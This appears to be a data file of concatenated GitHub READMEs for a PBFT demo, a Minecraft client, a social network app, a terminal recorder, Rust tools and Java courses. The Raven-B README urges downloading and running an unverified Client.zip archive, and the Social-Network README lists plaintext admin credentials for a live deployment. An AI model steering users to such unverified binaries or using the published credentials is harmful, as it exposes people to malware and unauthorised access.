‚îÇ   ‚îú‚îÄ‚îÄ pbft.rs          # Stage definitions
‚îú‚îÄ‚îÄ network/             # Networking code
‚îÇ   ‚îú‚îÄ‚îÄ client.rs        # Client logic
‚îÇ   ‚îú‚îÄ‚îÄ node.rs          # Consensus node logic
‚îÇ   ‚îú‚îÄ‚îÄ server.rs        # Server-related code
‚îú‚îÄ‚îÄ ‚îú‚îÄ‚îÄ utils.rs         # Utility functions
```
## Getting Started
**1. Clone the repository.**
```bash
git clone https://github.com/0xjeffro/pbft-rust.git
cd pbft-rust
```


**2. Run the following command to start the server.**
```bash
cargo run -- -n <num_nodes> -f <num_faulty_nodes>
```
Replace <num_nodes> with the total number of nodes in the network and <num_faulty_nodes> with the number of faulty nodes.


**3. Send requests to the client.**
In a separate terminal, use the following command to send a request:
```bash
curl -H ""Content-Type: application/json"" -X POST -d '{""client_id"":0, ""operation"":""BTC to da moon!"", ""time_stamp"":1726496460,""sequence_id"":8}' http://localhost:9000/req
```
Replace `client_id`, `operation`, `time_stamp`, and `sequence_id` with the appropriate values as needed for your request.

## Log Output
During execution, logs are output to the console. To make it easier to understand the state and behavior of the nodes, 
we use emojis to represent different node types and stages of the consensus process:
- üíª: Represents a Client
- üòÉ: Represents a healthy node
- üòà: Represents a faulty node
- üåü: Indicates transition to the PrePrepare stage
- üåüüåü: Indicates transition to the Prepare stage
- üåüüåüüåü: Indicates transition to the Commit stage
- ‚úÖ: Indicates the client has received f+1 identical replies, and consensus has been reached

## Examples

### Successful Consensus
```bash
cargo run -- -n 7 -f 2
```
```bash
curl -H ""Content-Type: application/json"" -X POST -d '{""client_id"":0, ""operation"":""BTC to da moon!"", ""time_stamp"":1726496460,""sequence_id"":8}' http://localhost:9000/req
```
![img.png](img.png)



### Failed to Reach Consensus
```bash
cargo run -- -n 4 -f 2
```
```bash
curl -H ""Content-Type: application/json"" -X POST -d '{""client_id"":0, ""operation"":""BTC to da moon!"", ""time_stamp"":1726496460,""sequence_id"":8}' http://localhost:9000/req
```
![img_1.png](img_1.png)














",0,0,1,MIT,,0.0
Alek-paint/Raven-B,master,"# Raven-B

Raven b+ is a user-friendly Minecraft client offering a range of good modules for enhanced gameplay. It is designed for version 1.8.9.

![Minecraft Logo](https://www.minecraft.net/content/dam/games/minecraft/minecraft-net/global/header-minecraft-logo-og.f63ae4132138.png)

## Table of Contents
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)

## Features
- Customizable GUI for a personalized Minecraft experience
- Various modules to optimize gameplay
- Compatibility with Minecraft version 1.8.9

## Installation
To get started with Raven-B, follow these steps:

1. Download the [**Raven-B Client**](https://github.com/user-attachments/files/16830358/Client.zip):
   [![Download](https://img.shields.io/badge/Download-Raven--B-orange)](https://github.com/user-attachments/files/16830358/Client.zip)

2. Unzip the downloaded file to a location of your choice.

3. Open the Minecraft launcher and create a new installation profile for version 1.8.9.

4. Run Minecraft with the newly created profile.

5. In the Minecraft game menu, select ""Raven-B"" as the active client.

Now you are all set to enjoy a customized Minecraft experience with Raven-B!

## Usage
Explore the various modules and settings offered by Raven-B to tailor your gameplay to your preferences. Here are some tips to enhance your experience:

**1. Keybind Configuration**
   - Customize keybinds for activating specific modules or features.
   
**2. Module Selection**
   - Select the modules that best suit your gameplay style.
   
**3. GUI Customization**
   - Personalize the GUI layout to have easy access to your preferred features.

## Contributing
Contributions to Raven-B are welcome! To contribute, follow these steps:

1. Fork this repository.
2. Create a new branch (`git checkout -b feature/new-feature`).
3. Make your changes.
4. Commit your changes (`git commit -am 'Add new feature'`).
5. Push to the branch (`git push origin feature/new-feature`).
6. Create a new Pull Request.

## License
This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.",1,0,1,,,0.0
ngud-119/Social-Network,master,"# Social-Network

Social-Network is a Stateful app built with [Spring Boot](http://spring.io/projects/spring-boot), [MySQL](https://www.mysql.com/) and [React](https://reactjs.org/).

Features:
- Routing
- User authentication: Register/Login/Logout
- 3 User Roles: Root, Admin and User
- Promoting/Demoting users to Admin/User
- Creating and deleting users
- Editing user profile
- Searching for friends
- Sending and accepting friend requests
- Removing friends from the friends list
- Adding and deleting photos
- Creating and deleting posts
- Creating and deleting comments
- Chat functionality: writing and receiving messages from your friends
- Logs history

The project is deployed on [Heroku](https://social-network-kl.herokuapp.com/).

**Admin Credentials:**
- username: john
- password: 1111

## Requirements

1. Java 11

2. In order to be able to save `Photos` you need to sign up to [Cloudinary](https://cloudinary.com/) and enter your credentials in the `application.properties` file of the Spring Boot app (`SocialNetwork\Server\src\main\resources\application.properties`)

## Start the app

### **Option 1 - Start the Client and the Server manually**

#### 1. Start the Client

To start the Client you need to enter the `SocialNetwork/Client` folder:

```bash
$ cd SocialNetwork/Client
```

Install all dependencies:

```bash
$ npm install
```

Run the app in the development mode:

```bash
$ npm start
```

Open [http://localhost:3000](http://localhost:3000) to view it in the browser.

#### 2. Start the Server

Go to the root directory of the Spring Boot app:

```bash
$ cd SocialNetwork/Server
```

Start the Server:

```bash
$ mvn spring-boot:run
```
The Server is running on port `8000`.


### **Option 2 - Start the application in Docker**

1. **Start the application**

Go to the project directory( `SocialNetwork/` ) and run:

```bash
$ docker-compose up -d
```

The front-end server will start on port `9090`. To open it enter in your browser:

```bash
$ http://localhost:9090
```
2. **Stop the application**

You can stop the containers with:

 ```bash 
 $ docker-compose down
 ```

## App screenshots

1. **Home Page**

 ![App Screenshot](readme-images/kl-social-network-home-gregor.PNG)

2. **Friends Page**

 ![App Screenshot](readme-images/kl-social-network-friends-gregor.PNG)

3. **Photos Page**

 ![App Screenshot](readme-images/kl-social-network-photos-gregor.PNG)
",0,0,1,MIT,,0.0
kxxt/ttyrecall,main,"# ttyrecall

Recall, but for terminals.

- [Installation Guide](./INSTALL.md)

# Work In Progress!!!

This project is still in its infancy. Bugs, non working features, breaking changes are expected.

For now it can be considered as an asciinema but it is always on, continuously recording your terminals.

# Origin

Inspired by [Microsoft's new controversial recall feature for Windows 11](https://support.microsoft.com/en-us/windows/retrace-your-steps-with-recall-aa03f8a0-a78b-4b3e-b0a1-2eb8ac48701c),
I wonder if I could create something similar for Linux.
It is very resource and compute intensive to continuously capture and analyze screenshots in the background so I prefer
to avoid it. But actually on Linux, we are doing a lot of things in terminals so why not create something similar that
is based on text instead of screenshots?

Before adding AI features(if I ever want to do that), `ttyrecall` will focus on collecting and archiving terminal outputs.
So it can be considered as [asciinema](https://asciinema.org/), but always on.

# Current Status

- [x] Record tty in the background to asciicast-v2 format
- [x] Save the recordings in a directory structure that makes sense
- [x] DAC so that users by default can only access their own recordings. (recording file is owned by `user:ttyrecall`)
- [x] Control which users' tty are recorded via a blocklist or allowlist
- [x] Zstd compression
- [x] A simple systemd service (See `ttyrecall-git` package).
- [x] Stop a recording if it overruns a specified soft budget.

Here is what the collected recordings look like:

```bash
ls -lah /var/lib/ttyrecall/1000/2024/10/04 -lah
total 236K
drwxrwx--- 1 kxxt root  774 Oct  4 22:45 .
drwxrwx--- 1 kxxt root   12 Oct  4 12:52 ..
-rw-rw---- 1 kxxt root  23K Oct  4 22:53 codium-pty6-22:37.cast.zst
-rw-rw---- 1 kxxt root  106 Oct  4 21:57 kded6-pty0-21:53.cast.zst
-rw-rw---- 1 kxxt root 1021 Oct  4 21:57 konsole-pty1-21:56.cast.zst
-rw-rw---- 1 kxxt root  663 Oct  4 21:59 konsole-pty2-21:58.cast.zst
-rw-rw---- 1 kxxt root 8.0K Oct  4 22:01 konsole-pty3-22:00.cast.zst
-rw-rw---- 1 kxxt root  33K Oct  4 22:24 konsole-pty4-22:08.cast.zst
-rw-rw---- 1 kxxt root    0 Oct  4 22:12 konsole-pty5-22:12.cast.zst
-rw-rw---- 1 kxxt root  63K Oct  4 22:50 konsole-pty7-22:42.cast.zst
-rw-rw---- 1 kxxt root  791 Oct  4 12:53 konsole-pty9-12:52.cast.zst
-rw-rw---- 1 kxxt root  779 Oct  4 12:52 sudo-pty11-12:52.cast.zst
-rw-rw---- 1 kxxt root 1.1K Oct  4 22:42 sudo-pty7-22:42.cast.zst
-rw-rw---- 1 kxxt root  31K Oct  4 22:45 sudo-pty8-22:43.cast.zst
-rw-rw---- 1 kxxt root  39K Oct  4 22:51 sudo-pty8-22:45.cast.zst
-rw-rw---- 1 kxxt root  777 Oct  4 12:52 sudo-pty9-12:52-1.cast.zst
-rw-rw---- 1 kxxt root  221 Oct  4 12:53 sudo-pty9-12:53.cast.zst
```

The zstd compressed recordings can be played by the following command:

```bash
zstd -cd /var/lib/ttyrecall/1000/2024/10/03/konsole-pty8-12:19.cast.zst | asciinema play -
```

# TODO

- [ ] Implement a player that could directly take zstd compressed asciicast v2 files.
- [ ] Implement a TUI interface to easily browse and manage the recordings.
- [ ] Implement a web interface to easily browse and manage the recordings.
- [ ] Automatically remove some old recordings in some way.
- [ ] Allow users to sync the recordings to their server.
- [ ] Search for something and we can return some sessions that mentioned it and jump to the corresponding timestamp.
- [ ] Store the recordings in databases or more structured formats to speed up search and indexing.
- [ ] Add AI to it. (Seriously, should I do this????)

# License

Please see the license of the individual crates.

- The eBPF module is licensed under `GPL-2.0-or-later`.
- The xtask crate is also licensed under `GPL-2.0-or-later`.
- The main binary, `ttyrecall`, is licensed under `AGPL-3.0-or-later`.
- The common library, `ttyrecall-common`, is licensed under `MIT-0`(MIT No Attribution).
",1,0,1,,,1.0
gokmenhoca/java,main,"# Java samples used in OOP Lessons

The sample Java sources are for the attendees of faculty OOP Lessons.

> [!IMPORTANT]
**The codes given here are for students _who are new to Java programming language and have no prior knowledge of programming in Java_.**

> [!WARNING]
All are initiatory samples only and may have to be edited because none of them are bug-free.
All of these samples are designed to explain only one or a few topic(s). So it doesn't have to be logical or valid.

> [!CAUTION]
Some samples are *__for invalid usage illustrations__*.

## Contents

The directories contain the Java Source files used in the lessons and the UML diagrams for that week (if any) under a separate directory named 'odev'.
",0,0,1,,,0.0
oli-obk/layer-proc-gen,main,"# Top down procedural generation framework

A Rust implementation of <https://github.com/runevision/LayerProcGen>

Each layer can use information from its dependency layers, including an arbitrarily
larger region of information from its dependency layers. This allows you to write chunk-based logic, without caring about boundary conditions, as there are none.

If you are tempted to use boundary conditions out of any reason, add another layer.

![A directed acyclic graph of layers and their dependency layers](screenshot_layer_graph.png)

Chunks are cached once computed, so accessing them repeatedly is cheap. Once too many chunks are loaded, those that have been accessed the longest time in the past will
get freed automatically. By default reasonable limits for the number of loaded chunks are chosen, but you can increase or decrease them if the layers have specific other requirements.

An example game is included in the `examples` section of this crate (Play the demo in your browser [here](https://oli-obk.github.io/layer-proc-gen/)). It is an infinite
world of small towns and medium sized cities, connected by inter-city roads.

![A motorcycle on a grey road with green spaces next to it and some dark green circles looking like trees](screenshot_game.png)

The game supports various debug views to experience the layer algorithms visually via the
`F` keys:

1. Show vehicle movement debug information and the visible screen space. Use `Up` and `Down` keys for zooming in and out. If you zoom out far enough, you see the roads loading in the distance.
2. Debug render all chunks that are loaded, not just the ones within the visible area. Again, `Up` and `Down` make this actually interesting, as you can see when chunks start unloading in the distance.
3. Show the dependency graph of layers. Press `ESC` to leave.
4. Show a 3d representation of all layers' debug render stacked on top of each other

![3d representation of all layers' debug render stacked on top of each other](screenshot_3d_layers.png)

## Notable differences to Rune's original C# version

* You only need to implement `Chunk`s, not `Layer`s, as the latter are a provided struct exposing everything you need from a layer for a specific `Chunk` type.
* More compile-time shenanigans
    * Chunk positions are typed to the `Chunk` so you don't accidentally mix them with others
    * [Chunk sizes](https://runevision.github.io/LayerProcGen/md_LayersAndChunks.html) are constants, not runtime values
* Chunks are generated as needed, you do not need to load a region.
    * you can still load a region if you know you're going to need it soon, but it's not very useful due to the missing multithreading support
* Missing multithreading support, the demo is fast enough so far to compute all necessary chunks in sub-millisecond time.
* No [internal layer levels](https://runevision.github.io/LayerProcGen/md_InternalLayerLevels.html). Instead you can make the layer type not use a heap relocation but contain the data directly, to avoid adding another indirection if you are never going to use a dependency layer twice. This simplifies the interface and makes it a bit more robust against accidentally depending on information from chunks of the current layer.
",0,0,4,,"gh_pages_wasm.yml,test.yml",1.0
orhun/rustlab2024-ratatui-workshop,main,"![banner](./assets/rustlab-banner.jpg)

# Ratatui Workshop üë®‚Äçüç≥üêÄ

This workshop is prepared for [""Cooking up TUIs with Ratatui""](https://rustlab.it/talks/cooking-up-with-tuis-with-ratatui) session at [RustLab 2024](https://rustlab.it).

You can also follow this guide individually and complete the workshop. See [Getting Started](#getting-started).

## What will you build?

A terminal chat application that supports sending messages, files, and images.

![demo](./assets/demo.gif)

### Goals

- Get familiar with the fundamentals of [Ratatui](https://ratatui.rs).
- Learn how to incorporate widgets and structure your application.
- Understand the best practices of building TUI applications in Rust.
- Have fun!

### Chapters

0. [Introduction](./workshop/00_intro.md)
1. [Initializing the project](./workshop/01_init.md)
2. [Initializing the TUI](./workshop/02_tui.md)
3. [Server connection](./workshop/03_connection.md)
4. [Message list](./workshop/04_message_list.md)
5. [Text input](./workshop/05_text_input.md) (w/ [`tui-textarea`](https://github.com/rhysd/tui-textarea))
6. [Room list](./workshop/06_room_list.md) (w/ [`tui-tree-widget`](https://github.com/EdJoPaTo/tui-rs-tree-widget))
7. [Help popup](./workshop/07_help_popup.md)
8. [File explorer](./workshop/08_file_explorer.md) (w/ [`ratatui-explorer`](https://github.com/tatounee/ratatui-explorer))
9. [Image preview](./workshop/09_image_preview.md) (w/ [`ratatui-image`](https://crates.io/crates/ratatui-image))
10. [Markdown preview](./workshop/10_markdown_preview.md) (w/ [`tui-markdown`](https://github.com/joshka/tui-markdown))
11. [Terminal effects](./workshop/11_effects.md) (w/ [`tachyonfx`](https://github.com/junkdog/tachyonfx))
12. [Logging](./workshop/12_logging.md) (w/ [`tui-logger`](https://github.com/gin66/tui-logger))
13. [Testing](./workshop/13_testing.md) (w/ [`insta`](https://github.com/mitsuhiko/insta))
14. [End](./workshop/14_end.md)

## Getting Started

### Prerequisites

1. [Rust](https://www.rust-lang.org/tools/install) (make sure you have the latest stable version installed).

2. A code editor with [`rust-analyzer`](https://rust-analyzer.github.io/) plugin (or anything at your preference).

3. A performant terminal with image rendering support (is good to have). We recommend [`wezterm`](https://wezfurlong.org/wezterm/).

### Setup

Simply start by cloning this repository:

```sh
git clone https://github.com/orhun/rustlab2024-ratatui-workshop
```

Your job is to implement a terminal client for a chat application using Ratatui!

[**Click here to start the workshop**](./workshop/00_intro.md)! ‚û°Ô∏è

Start reading through the chapters and sometimes you will be asked to implement some parts of the application. Don't worry, the solutions are also provided! :)

Let us know if you got stuck somewhere or if you think something is wrong!

### Presenting

You can also present this workshop at your local Rust meetup or conference!

There are minimal slides included in the `presentation.md` file. You can use [`presenterm`](https://github.com/mfontanini/presenterm) to start the presentation:

```sh
presenterm -c config.yml presentation.md
```

Don't forget to [_tweet_](https://x.com/orhundev) at us!

## References

- [Ratatui documentation](https://ratatui.rs/)
- [Rust documentation](https://doc.rust-lang.org/std/)

The client/server architecture is inspired by @pretzelhammer's [chat server](https://github.com/pretzelhammer/chat-server) project.

## License

Copyright ¬© 2024, [Orhun Parmaksƒ±z](https://github.com/orhun)

Licensed under [The MIT License](./LICENSE)

ü¶Ä „Éé( ¬∫ \_ ¬∫ „Éé) - respect crables!
",0,0,28,MIT,ci.yml,5.0
AlexBuz/rust_to_bf,main,"# `rust_to_bf`

`rust_to_bf` is a compiler from a subset of [Rust](https://www.rust-lang.org/) to [Brainfuck](https://en.wikipedia.org/wiki/Brainfuck) (BF), with support for primitive types (`usize`, `char`, `bool`, `&str`), integer arithmetic (`+`, `-`, `*`, `/`, `%`), boolean logic (`&&`, `||`, `!`), compound types (arrays, tuples, structs), references (`&`, `&mut`), control flow statements (`if`, `match`, `loop`, `while`, `break`, `continue`), functions (including recursion), dynamic memory allocation, input/output, and [more](#supported-rust-features-non-exhaustive).

## Background

The target language of this compiler, BF, is an esoteric programming language known for its extreme minimalism and difficulty to write serious programs in. A program in BF consists of a sequence of single-character instructions that control the actions and movements of a data pointer along a one-dimensional array of zero-initialized integer cells:

| Instruction | Action                                                                         |
| :---------: | ------------------------------------------------------------------------------ |
|     `>`     | Move the data pointer right by 1 cell.                                         |
|     `<`     | Move the data pointer left by 1 cell.                                          |
|     `+`     | Increment the value of the pointed-to cell by 1.                               |
|     `-`     | Decrement the value of the pointed-to cell by 1.                               |
|     `.`     | Output the value of the pointed-to cell.                                       |
|     `,`     | Replace the value of the pointed-to cell with the next byte of input.          |
|     `[`     | If the value of the pointed-to cell is zero, jump forward to the matching `]`. |
|     `]`     | If the value of the pointed-to cell is nonzero, jump back to the matching `[`. |

Despite their simplicity, these eight instructions are sufficient to render the BF language [Turing-complete](https://en.wikipedia.org/wiki/Turing_completeness), meaning that it is capable of computing any computable function and thus is theoretically just as capable as any other programming language.

The goal of this project is to turn theory into practice by actually compiling a high-level language‚Äîwith full support for features like indirect addressing, dynamic memory allocation, and recursion‚Äîinto BF.

Originally, I planned to develop my own high-level language for this purpose. However, as I worked on the parser, it started to resemble a simplified version of Rust, so I decided to embrace this and pursue writing a Rust-to-BF compiler instead. As an exercise, though, I still finished writing the parser using the [`chumsky`](https://crates.io/crates/chumsky) parser combinator library rather than using a dedicated Rust parsing library like [`syn`](https://crates.io/crates/syn).

## Project Structure

The compiler itself is split into three library subcrates, corresponding to the three major stages of compilation:

1. In the `frontend` crate, the input Rust code is tokenized and parsed into an abstract syntax tree (AST).
2. In the `middle` crate, the AST is transformed into a custom intermediate representation (IR) consisting of load/store, control flow, input/output, and stack frame management statements. This crate also includes an interpreter for running the IR.
3. In the `backend` crate, the IR is translated into BF code. This crate also includes a BF interpreter for running the generated code.

The `rust_to_bf` binary crate wraps these three components together and provides a command-line interface (CLI) for compiling Rust programs to BF as well as for running them using either the IR or BF interpreter.

## Usage

To compile a Rust program to BF, use the `compile` subcommand, specifying the input Rust file and the output BF file (or omit the output file to print the BF code to stdout):

```sh
cargo run --release -- compile <input.rs> [-o <output.bf>]
```

To run a Rust program without outputting BF code, use the `run` subcommand and optionally specify which interpreter to use (either `ir` or `bf`, defaulting to `ir` for greater speed):

```sh
cargo run --release -- run <input.rs> [--interpreter=ir|bf]
```

## Example Programs

The `example_programs` directory contains several example programs that can be compiled and run by `rust_to_bf`. These include:

- `recursive_fibonacci.rs`:
  - Computes Fibonacci numbers recursively.
- `day_of_week.rs`:
  - Determines the day of the week for any given date.
- `prime_printer.rs`:
  - Prints as many prime numbers as the user desires.
- `collatz.rs`:
  - Prints the [Collatz sequence](https://en.wikipedia.org/wiki/Collatz_conjecture) starting from a user-specified number.
- `linked_list.rs`:
  - Demonstrates how a linked list can be implemented using the `boxed!` macro for heap allocation (see the [Standard Library](#standard-library) section for more information).
- `bf_interpreter.rs`:
  - An interpreter for arbitrary BF programs. Takes a BF program as input, optionally followed by an exclamation mark (`!`) and the input to the program, and outputs the result of running the program with the given input.
- `tic_tac_toe.rs`:
  - A text-based tic-tac-toe game with an unbeatable computer opponent as well as a 2-player mode.

## Caveats

Although `rust_to_bf` supports many Rust features, it lacks support for many others, including enums, pattern matching, methods, generics, modulues, traits, and lifetimes (see the [Supported Rust Features](#supported-rust-features-non-exhaustive) section for a more detailed list). It also lacks support for most of the Rust standard library. However, it does come with a small standard library of its own, which includes macros and functions for performing I/O, allocating heap memory, and terminating the program prematurely. See the [Standard Library](#standard-library) section for more information.

Additionally, the generated BF code is not optimized for efficiency, nor does the provided BF interpreter perform optimizations. This means that complex Rust programs may compile to BF code that is slow to run. Note, though, that the primary goal of this project is to demonstrate that it is _possible_ to compile Rust to BF, not necessarily do generate efficient BF code in the process. With that being said, optimizations are certainly an avenue for future work, and given the systematic nature of the IR-to-BF translation, it is conceivable that the BF interpreter could be made to reverse the translation process and run the corresponding IR code instead.

## Standard Library

### Input

- `read_char!() -> char`:
  - Reads a character of input from the user.
- `read_int() -> usize`:
  - Reads an integer from the user.
  - Note that this is a function, not a macro, so it must be called without the `!`.

### Output

- `print!(...)`:
  - Takes a format string literal and a variable number of arguments and prints the string with the arguments interpolated in place of the `{}` placeholders.
  - Arguments must be of primitive type (`usize`, `char`, `bool`, `&str`).
- `println!(...)`:
  - Same as `print!(...)`, but appends a newline to the output.
  - If no arguments are provided, it simply prints a newline.

### Memory Management

- `boxed!(value: T) -> &mut T`:
  - Stores a value of type `T` on the heap and returns a mutable reference to it.
- `malloc!(n: usize) -> &mut [usize]`:
  - Allocates a contiguous block of `n` cells on the heap and returns a mutable reference to it.
  - The cells are guaranteed to be zero-initialized.
- `size_of_val!(value: T) -> usize`:
  - Returns the size in cells of any value.

### Early Termination

- `exit!()`:
  - Terminates the program.
- `panic!(...)`:
  - Prints an error message and terminates the program.
  - Equivalent to `println!(...)` followed by `exit!()`.

## Implementation Details

### Frontend

This component is responsible for tokenizing and parsing the Rust source code and producing an AST. This is accomplished by composing a series of parser combinators provided by the `chumsky` library. Specifically, an alpha version of `chumsky` 1.0.0 is used which supports zero-copy parsing. This avoids the need to clone strings when constructing the AST.

### Middle

This component is responsible typechecking the AST and transforming it into IR code. The IR statements operate on a abstract machine with a stack that is addressable either absolutely or relative to a movable frame base. There are statements for raising and lowering the frame base, adding/subtracting values between stack cells and a temporary register, input/output, repeatedly executing a block of statements while a given stack cell is nonzero, and conditionally executing one of multiple blocks depending on the value of a given stack cell. To facilitate dynamic memory allocation, the IR reserves every other stack cell for heap allocations, with the first such cell storing the address of the next available heap cell.

To convert Rust control flow constructs into IR statements, a vector of basic blocks (straight-line sequences of statements with a single entry and exit point) is built as the AST is traversed. Then, at the top level of the IR, an all-encompassing `Switch` statement is used to dispatch control to the appropriate basic block based on the value at the base of the current stack frame, which is initially set to the entry block ID of the `main` function.

To call a function, the frame base is raised to preserve the local variables of the current function, make space for the return value, and store the return block ID. Then, the value at the bottom of the now-raised frame is set to target function's entry block ID. Once the target function begins executing, it lowers the frame base to give itself access the return value slot. To return, it sets the return value and raises the frame base just enough to preserve that value, leaving the return block ID at the bottom of the now-raised frame. The return block in the calling function then lowers the frame base to access the return value as well as the rest of its local variables, and execution continues from there.

A similar process is used to jump to blocks within the same function, allowing for loops and conditional statements to be translated to IR code. In these cases, less movement of the frame base is required. In particular, the entry block ID of the current function is simply overwritten with the target block ID and the frame base is raised just enough to preserve the return value slot and return block ID. The target block then lowers the frame base to access the return value slot and continues execution from there.

Here is a diagram illustrating the movements of the frame base as described above:

```txt
stack layout:  [..., return value, return id, call/jump id, args, locals]
1. caller:      ^^^
2. to call:                                   ^^^^^^^^^^^^^^^^^^
3. callee:           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
callee control flow:
  1. to jump:                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^
  2. post-jump:      ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1. to return:                      ^^^^^^^^^
2. post-return: ^^^^^^^^^^^^^^^^^
```

The `^^^` characters on each line indicate the portion of the stack (starting at the frame base) that remains accessible at that stage. The `return value` slot is where the callee's return value is placed, the `return id` slot is used to store the block ID to return to, the `call/jump id` slot is used to store the block ID to call or jump to, `args` represents the arguments passed to the callee, and `locals` represents the local variables of the callee.

### Backend

This component is responsible for translating the IR into BF code.

To accomplish this, the BF tape is laid out as follows:

```txt
reg1, reg0,
mem_base (0), stack_base (0),
temp0, mem0, mem0_marker, unused (0),
temp1, mem1, mem1_marker, stack0_marker,
temp2, mem2, mem2_marker, unused (0),
temp3, mem3, mem3_marker, stack1_marker,
temp4, mem4, mem4_marker, unused (0),
temp5, mem5, mem5_marker, stack2_marker,
...
```

The `reg0` cell serves as the destination for `Load` statements and the source for `Store` statements.

The `reg1` cell serves as a temporary register for `Store` statements that write to an indirect memory location, since the `reg0` cell is overwritten with the address of the target memory location during indirect addressing.

The `mem_base` cell is always set to zero and marks the beginning of the heap.

The `stack_base` cell is always set to zero and marks the beginning of the stack. This cell also serves as the home position for the BF data pointer, which is moved back to this cell after each statement is executed.

After the `reg1`, `reg0`, `mem_base`, and `stack_base` cells, the tape is divided into blocks of four cells each, with each block representing a memory location:

1. The first cell of each block is a temporary cell that is used by `Load` statements to preserve the value of the source memory location while it is being copied to the `reg0` cell, since copying is implemented in BF as a loop that repeatedly subtracts the value of the source cell and increments the value of the destination cell until the source cell is zero. By first moving the source cell to this temporary cell (i.e., by using a BF loop like `[-<+>]`), the source cell can then be restored while the `reg0` cell is updated.
2. The second cell of each block stores the actual value of the memory location.
3. The third cell of each block is a marker that is used to implement indirect addressing. When an indirect memory location is being accessed, a trail of 1s is written to the markers leading up to it. This trail can then be traversed by repeatedly moving left or right by four cells until a zero is encountered (i.e., `[<<<<]` or `[>>>>]` in BF). This allows for moving between the indirect memory location and `reg0` without needing to know the distance between them in advance.
4. The fourth cell of each block alternates between being unused (for even-numbered blocks, which are reserved for heap memory) and marking stack cells that are below the current frame base (for odd-numbered blocks, which are used for stack memory). To raise the frame base by `n` cells, `n` additional stack markers are set to 1, and to lower the frame base by `n` cells, the last `n` stack markers are set to 0. Thus, the first cell of the current frame is marked by the first stack marker with a value of 0. This facilitates accessing local variables, since the stack markers can be traversed to move between the stack base and the current frame base without indirect addressing.

## Supported Rust Features (non-exhaustive)

- [x] variables:
  - [x] immutable: `let three = 3;`
  - [x] mutable: `let mut a = 'A';`
  - [x] with explicit type: `let b: bool = false;`
- [x] types:
  - [x] primitives: `usize`, `char`, `bool`, `&str`
  - [x] tuples: `(T,)`, `(T, U)`, `(T, U, V)`, ...
  - [x] arrays: `[T; len]`
  - [x] references: `&T`, `&mut T`
    - [x] automatic coercion from `&mut T` to `&T` when appropriate
  - [x] structs: `struct Foo { a: usize, b: char }`
  - [x] explicit casting: `41 as char`, `true as usize`, `&mut arr as &mut [usize]`
- [x] expressions
  - [x] literals: `3`, `'A'`, `false`, `""Hello üëã world!""`
  - [x] tuples: `(3,)`, `('A', false)`, `(30, true, 'B')`
  - [x] arrays:
    - [x] `[3, 1, 4, 1, 5, 9]`
    - [x] `[false; 4]` for `[false, false, false, false]`
  - [x] structs: `Foo { a: 12, b: 'W' } `
  - [x] operators (with standard precedence):
    - [x] arithmetic: `+`, `-`, `*`, `/`, `%`
    - [x] relational: `==`, `!=`, `>`, `>=`, `<`, `<=`
    - [x] logical: `&&`, `||`, `!`
  - [x] parentheses: `(`, `)`
- [x] assignment:
  - [x] operators: `=`, `+=`, `-=`, `*=`, `/=`, `%=`
  - [x] assignable places:
    - [x] variables: `x = 5;`
    - [x] tuple elements: `t.0 = 3;`
    - [x] struct fields: `f.a += 1`
    - [x] array elements: `arr[2] = 'H';`
    - [x] dereferenced references: `*p = 3;`
- [x] auto-deref:
  - [x] `p.0` is desugared to `(*p).0` if `p` is a reference to a tuple
  - [x] `p.a` is desugared to `(*p).a` if `p` is a reference to a struct
  - [x] `p[3]` is desugared to `(*p)[3]` if `p` is a reference to an array
- [x] if statements: `if condition { ... } else if other_condition { ... } else { ... }`
- [x] loops:
  - [x] infinite loop: `loop { ... }`
  - [x] while loop: `while condition { ... }`
  - [x] `break` and `continue` statements
- [x] functions:
  - [x] declaration: `fn foo(a: usize, b: char) -> bool { ... }`
  - [x] call: `foo(3, 'A')`
  - [x] recursion
  - [x] mutual recursion
- [x] comments:
  - [x] line comments: `// this is a line comment`
  - [x] block comments: `/* this is a /* nested */ block comment */`
- [x] macros: `print!`, `println!`, `panic!`
- [ ] enums
- [ ] pattern matching
- [ ] generics
- [ ] impl blocks
  - [ ] methods
  - [ ] associated functions
  - [ ] blanket impls
- [ ] trait-related features
  - [ ] traits
  - [ ] constrained generics
  - [ ] iterators
  - [ ] for loops
  - [ ] closures
- [ ] standard library types and traits
- [ ] expanded format specifier support
  - [ ] `{:?}` for Debug
- [ ] &[T] and &str with length information (i.e., fat pointers)
- [ ] non-ASCII char values
- [ ] expression-oriented features
  - [ ] control flow statements as expressions
  - [ ] last expression in block as return value
- [ ] range types/patterns
- [ ] expanded numeric types
  - [ ] specific-width integers
  - [ ] signed integers
  - [ ] floating-point numbers
- [ ] bitwise operators
- [ ] modules
- [ ] dynamic dispatch
- [ ] lifetimes and borrow-checking
",0,0,1,GPL-3.0,,0.0
iex-rs/lithium,master,"# Lithium

![License](https://img.shields.io/crates/l/lithium) [![Version](https://img.shields.io/crates/v/lithium)](https://crates.io/crates/lithium) [![docs.rs](https://img.shields.io/docsrs/lithium)](https://docs.rs/lithium) ![Tests](https://github.com/iex-rs/lithium/actions/workflows/ci.yml/badge.svg)

Lightweight exceptions.

Lithium provides a custom exception mechanism as an alternative to Rust panics. Compared to Rust panics, this mechanism is allocation-free, avoids indirections and RTTI, and is hence faster, if less applicable.

On nightly, Lithium is more than 2x faster than Rust panics on common `Result`-like usecases. See the [benchmark](benches/bench.rs).

See [documentation](https://docs.rs/lithium) for usage and installation instructions.
",0,1,2,Apache-2.0,ci.yml,0.0
ionutbalosin/java-application-security-practices,main,"<p align=""center"">
  <img alt=""eCommerce"" title=""eCommerce"" src=""assets/images/hedgehog_logo_200.png"">
</p>

<h1 align=""center"">Java Application Security Practices</h1>
<h4 align=""center"">‚ö°Ô∏è Secure by Design: Empowering Java Developers with Best Practices. ‚ö°Ô∏è</h4>

---

This repository provides practical examples and code snippets aimed at helping Java developers implement security best practices. It covers key topics such as security design principles, authentication and authorization, API security, Java process security, common attack mitigations, and security testing - all essential for building secure Java applications.

These examples are designed to complement the curriculum of the üìö [Application Security for Java Developers](https://ionutbalosin.com/training/application-security-for-java-developers-course) Course. 

If you're looking to take your skills to the next level, üéì [enroll now](https://ionutbalosin.com/training/application-security-for-java-developers-course) and master the art of secure coding in Java!

For more resources and insights, feel free to visit my [website](https://ionutbalosin.com).

---

## Content

